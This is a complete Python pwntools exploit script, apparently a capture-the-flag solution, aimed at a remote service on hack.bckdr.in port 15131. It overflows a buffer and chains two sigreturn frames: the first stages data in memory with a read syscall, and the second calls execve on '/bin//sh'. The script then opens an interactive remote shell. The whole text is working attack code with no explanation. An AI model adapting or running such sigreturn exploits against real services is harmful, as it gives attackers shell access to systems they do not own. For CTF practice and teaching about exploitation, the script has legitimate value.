from pwn import *

r = remote('hack.bckdr.in', 15131)

pop_rax = 0x40104d
syscall = 0x40100c

exploit = ''
exploit += 'AAAABBBBCCCCDDDD'
exploit += p64(pop_rax)
exploit += p64(15)
exploit += p64(syscall)
frame = SigreturnFrame(arch='amd64')
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x402000
frame.rdx = 0x200
frame.rsp = 0x402000 + 9
frame.rip = syscall
exploit += str(frame)
r.sendline(exploit)

exploit = ''
exploit += '/bin//sh\x00'
exploit += p64(pop_rax)
exploit += p64(15)
exploit += p64(syscall)
frame = SigreturnFrame(arch="amd64")
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rdx = 0
frame.rsi = 0
frame.rsp = 0x402000 + len(exploit) + 256 
frame.rip = syscall 
exploit += str(frame)
r.sendline(exploit)

r.interactive()
